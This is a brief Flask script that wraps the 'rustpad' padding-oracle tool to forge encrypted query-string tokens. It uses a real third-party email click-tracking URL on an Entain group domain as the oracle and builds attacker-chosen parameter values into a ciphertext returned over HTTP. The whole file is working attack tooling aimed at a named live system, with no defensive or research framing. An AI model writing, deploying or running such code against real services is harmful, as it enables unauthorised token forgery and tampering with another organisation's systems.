from flask import Flask
from flask import request
import subprocess

app = Flask(__name__)


@app.route('/')
def hello():
    s = request.args.get('s')
    b = request.args.get('b')
    d = request.args.get('d')
    m = request.args.get('m')
    n = request.args.get('n')
    if None in [s,b,d,m,n]:
        return f'Missing parameters {[s,b,d,m,n]}'
    new_ciphertext = f"&b={b}&d={d}&m={m}&n={n}&s={s}"
    new_ct_blocks = (len(new_ciphertext) // 8) + 1
    output = subprocess.run(["./rustpad", "web", "--oracle", "https://click.e.entaingroup.com/?qs=CTEXT", "-D", "0000000000000000", "-E", new_ciphertext, "-B", str(8), "--no-iv", "-t", str(100)], capture_output=True)
    return output.stdout
